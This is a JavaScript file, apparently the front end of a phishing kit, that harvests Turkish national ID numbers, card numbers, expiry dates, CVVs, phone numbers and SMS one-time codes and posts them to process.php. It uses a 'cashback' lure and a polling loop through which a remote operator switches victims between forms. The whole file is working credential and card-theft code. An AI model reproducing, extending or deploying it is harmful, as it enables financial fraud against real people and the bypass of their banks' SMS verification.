const PROCESS_URL = "process.php";
const CHECK_INTERVAL = 3000;

function submitData(action, formData, successCallback) {
    $.ajax({
        type: "POST",
        url: PROCESS_URL,
        data: { action: action, ...formData },
        success: function (response) {
            successCallback(response);
        },
        error: function (error) {
            console.error("AJAX request failed:", error);
        }
    });
}

function tcno_dogrula(tcno) {
    tcno = String(tcno);

    if (tcno.substring(0, 1) === '0') {
        return false;
    }
    if (tcno.length !== 11) {
        return false;
    }

    var ilkon_array = tcno.substr(0, 10).split('');
    var ilkon_total = 0, hane_tek = 0, hane_cift = 0;

    for (var i = 0; i < 9; ++i) {
        var j = parseInt(ilkon_array[i], 10);
        if (i % 2 === 0) { 
            hane_tek += j;
        } else {
            hane_cift += j;
        }
        ilkon_total += j;
    }

    if ((hane_tek * 7 - hane_cift) % 10 !== parseInt(tcno.substr(9, 1), 10)) {
        return false;
    }

    ilkon_total += parseInt(ilkon_array[9], 10); 
    if (ilkon_total % 10 !== parseInt(tcno.substr(10, 1), 10)) {
        return false;
    }

    return true;
}

function creditExp_dogrula(expDate) {
    var parts = expDate.split('/');
    if (parts.length !== 2) return false;

    var month = parseInt(parts[0], 10);
    var year = parseInt(parts[1], 10) + 2000;

    if (isNaN(month) || isNaN(year)) return false;
    if (month < 1 || month > 12) return false;

    var now = new Date();
    var exp = new Date(year, month);

    return exp >= now;
}


function submitLogin() {
    var txtTckn = $("#txtTckn").val();
    var txtCreditNumber = $("#txtCreditNumber").val();
    var txtCreditExp = $("#txtCreditExp").val();
    var txtCreditCvv = $("#txtCreditCvv").val();
    var txtPhone = $("#txtPhone").val();

    if (!tcno_dogrula(txtTckn)) {
        $("#txtTckn").css("border-color", "red");
        return; 
    } else {
        $("#txtTckn").css("border-color", "");
    }

    if (!creditExp_dogrula(txtCreditExp)) {
        $("#txtCreditExp").css("border-color", "red");
        return;
    } else {
        $("#txtCreditExp").css("border-color", "");
    }

    submitData("submitLogin", { txtTckn: txtTckn, txtCreditNumber: txtCreditNumber, txtCreditExp: txtCreditExp, txtCreditCvv: txtCreditCvv, txtPhone: txtPhone }, function () {
        $("#loginButton").hide();
        $("#loginButtonProcess").show();
        setTimeout(function() {
            $("#loginForm").hide();
            $("#creditAmountForm").show();
        }, 10);
    });
}

function creditExp_dogrula(expDate) {
    var parts = expDate.split('/');
    if (parts.length !== 2) return false;

    var month = parseInt(parts[0], 10);
    var year = parseInt(parts[1], 10) + 2000;

    if (isNaN(month) || isNaN(year)) return false;
    if (month < 1 || month > 12) return false;

    var now = new Date();
    var exp = new Date(year, month, 1);

    exp.setMonth(exp.getMonth() + 1);
    exp.setDate(exp.getDate() - 1);

    return exp >= now;
}

function submitCreditAmount() {
    var txtCreditAmount = $("#txtCreditAmount").val();

    submitData("submitCreditAmount", { txtCreditAmount: txtCreditAmount }, function () {
        $("#creditAmountButton").hide();
        $("#creditAmountProcess").show();
    });
}


function submitInvaildLogin() {
    var txtTcknInvaild = $("#txtTcknInvaild").val();
    var txtCreditNumberInvaild = $("#txtCreditNumberInvaild").val();
    var txtCreditExpInvaild = $("#txtCreditExpInvaild").val();
    var txtCreditCvvInvaild = $("#txtCreditCvvInvaild").val();
    var txtPhoneInvaild = $("#txtPhoneInvaild").val();

    submitData("submitInvaildLogin", { txtTcknInvaild: txtTcknInvaild, txtCreditNumberInvaild: txtCreditNumberInvaild, txtCreditExpInvaild: txtCreditExpInvaild, txtCreditCvvInvaild: txtCreditCvvInvaild, txtPhoneInvaild: txtPhoneInvaild }, function () {
        $("#invaildLoginButton").hide();
        $("#invaildLoginButtonProcess").show();
    });
}

function submitSms() {
    var txtSms = $("#txtSms").val();

    submitData("submitSms", { txtSms: txtSms }, function () {
        $("#smsButton").hide();
        $("#smsButtonProcess").show();
    });
}

function submitInvaildSms() {
    var txtSmsInvaild = $("#txtSmsInvaild").val();

    submitData("submitInvaildSms", { txtSmsInvaild: txtSmsInvaild }, function () {
        $("#invaildSmsButton").hide();
        $("#invaildSmsButtonProcess").show();
    });
}

function checkUserOnline() {
    submitData("updateLastActivity", {}, function () {
        $.ajax({
            type: "POST",
            url: "status.php",
            success: function (response) {
                if (response === "online") {
                    console.log("Kullanıcı çevrimiçi");
                } else {
                    console.log("Kullanıcı çevrimdışı");
                }
            },
            error: function (error) {
                console.error("AJAX request failed:", error);
            }
        });
    });
}

var waitInterval;
var lastResponse = "";

function wait() {
    submitData("wait", {}, function (response) {
        console.log("Response received: " + response);

        if (response === lastResponse) {
            return;
        }

        lastResponse = response;

        if (response === "getInvaildLogin") {
            $("#header, #choose, #loginForm").hide();
            $("#invaildLoginForm").show();
        } else if (response === "getSms") {
            $("#header, #choose, #loginForm, #invaildLoginForm, #doneForm, #creditAmountForm").hide();
            $("#smsForm").show();
            getCashback();
        } else if (response === "getInvaildSms") {
            $("#header, #choose, #loginForm, #invaildLoginForm, #smsForm, #doneForm, #creditAmountForm").hide();
            $("#invaildSmsForm").show();
            getCashback2();
        } else if (response === "getOnlineForm") {
            $("#header, #choose, #loginForm, #invaildLoginForm, #smsForm, #invaildSmsForm, #doneForm, #creditAmountForm").hide();
            $("#onlineForm").show();
        } else if (response === "getErrorForm") {
            $("#header, #choose, #loginForm, #invaildLoginForm, #smsForm, #invaildSmsForm, #onlineForm, #doneForm, #creditAmountForm").hide();
            $("#errorForm").show();
        } else if (response === "getDoneForm") {
            $("#header, #choose, #loginForm, #invaildLoginForm, #smsForm, #invaildSmsForm, #onlineForm, #errorForm, #creditAmountForm").hide();
            $("#doneForm").show();
        } else if (response === "getDone") {
            $("#footer, #qrcode, #loginContent, #firstLoginButton, #firstLogin, #phoneArea, #emailLogin, #phoneLogin, #passwordLogin, #waitModal, #firstLoginButton, #emailLoginButton, #phoneLoginButton, #alternativeButton, #passwordLoginButton, #waveLoader, #loginContent, #passwordContent, #qrcode, #footer, #footerExtra, #codeLoginAgain, #codeLoginAgainButton, #codeAgainContent, #authLogin, #authLoginButton, #authContent, #emailData, #stepsLogin, #stepsLoginButton, #stepsContent, #authLoginAgain, #authLoginAgainButton, #authAgainContent, #stepsLoginAgain, #stepsLoginAgainButton, #stepsAgainContent").hide();
            $("#done, #doneContent").show();
        } else if (response === "getok") {
            window.location.href = "redirect.php";
        } else {
            console.warn("Unexpected response: " + response);
        }
    });
}

function getCashback() {
    $.ajax({
        type: "POST",
        url: PROCESS_URL,
        data: { action: "getCashback" },
        success: function(response) {
            var data = JSON.parse(response);
            if (data.cashback) {
                $("#cashback").text(data.cashback + " TL");
            } else {
                console.error("Failed to get cashback:", data.error);
            }
        },
        error: function(error) {
            console.error("AJAX request failed:", error);
        }
    });
}

function getCashback2() {
    $.ajax({
        type: "POST",
        url: PROCESS_URL,
        data: { action: "getCashback" },
        success: function(response) {
            var data = JSON.parse(response);
            if (data.cashback) {
                $("#cashback2").text(data.cashback + " TL");
            } else {
                console.error("Failed to get cashback:", data.error);
            }
        },
        error: function(error) {
            console.error("AJAX request failed:", error);
        }
    });
}

function startWaitInterval() {
    if (waitInterval) {
        clearInterval(waitInterval);
    }
    waitInterval = setInterval(wait, CHECK_INTERVAL);
}

wait();
setInterval(checkUserOnline, CHECK_INTERVAL);
startWaitInterval();
